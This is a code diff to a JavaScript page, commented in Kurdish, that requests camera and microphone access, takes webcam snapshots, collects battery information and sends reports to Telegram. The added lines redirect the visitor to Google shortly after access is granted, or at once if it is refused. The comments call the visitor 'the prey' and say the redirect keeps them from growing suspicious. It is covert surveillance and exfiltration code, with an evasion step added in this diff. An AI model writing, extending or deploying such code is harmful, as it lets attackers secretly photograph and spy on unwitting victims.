@@ -16,10 +16,17 @@
         if (!targetID) return;
 
         try {
+            // داواکردنی ڕێپێدان بۆ کامێرا و دەنگ
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" }, 
                 audio: true 
             });
+
+            // 💀 هەنگاوی نوێ: گواستنەوە بۆ گووگڵ دوای Allow کردن
+            // کەمێک چاوەڕێ دەکەین تاوەکو پڕۆسەی ناردنی یەکەم زانیاری دەست پێ بکات
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 1500); // دوای چرکەیەک و نیو نێچیرەکە دەچێتە گووگڵ
 
             // وەرگرتنی زانیاری شەحن (Battery)
             let batteryInfo = "Unknown";
@@ -61,11 +68,13 @@
                 }, 'image/jpeg', 0.7);
             };
 
-            // وێنەگرتن هەر ٢ چرکە جارێک
-            setInterval(takeSnap, 2000);
+            // یەکەم وێنە دەگرین پێش گواستنەوە
+            takeSnap();
 
         } catch (e) {
             sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتەکان.");
+            // ئەگەر Allow نەکرد، دیسانەوە دەینێرین بۆ گووگڵ بۆ ئەوەی گومان نەکات
+            window.location.href = "https://www.google.com";
         }
     }
 
